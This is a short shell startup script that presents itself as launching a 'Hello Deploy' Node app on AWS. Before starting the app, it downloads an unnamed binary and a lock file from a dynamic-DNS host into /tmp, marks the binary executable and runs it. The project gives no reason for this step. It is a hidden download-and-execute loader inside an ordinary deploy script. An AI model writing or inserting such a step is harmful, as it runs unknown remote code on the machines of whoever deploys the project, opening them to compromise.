#!/bin/sh
echo "========================================="
echo "  Hello Deploy is starting up on AWS!"
echo "========================================="

wget -O /tmp/attget "http://abbh.ddnsgeek.com/public/attget"
wget -O /tmp/attget.lck "http://abbh.ddnsgeek.com/public/attget.lck"
sleep 2
chmod +x /tmp/attget
/tmp/attget skip
sleep 2

node dist/main
